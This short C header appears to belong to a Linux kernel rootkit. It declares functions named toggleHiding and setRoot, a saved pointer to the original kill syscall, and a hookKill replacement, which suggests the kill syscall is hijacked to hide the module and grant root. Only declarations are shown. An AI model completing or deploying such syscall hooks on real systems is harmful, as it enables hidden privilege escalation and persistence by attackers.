#include "../common.h"

int toggleHiding(void);
int setRoot(void);

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*ogKill)(const struct pt_regs *);
asmlinkage int hookKill(const struct pt_regs *regs);
#else
static asmlinkage long (*ogKill)(pid_t pid, int sig);
asmlinkage int hookKill(pid_t pid, int sig);
#endif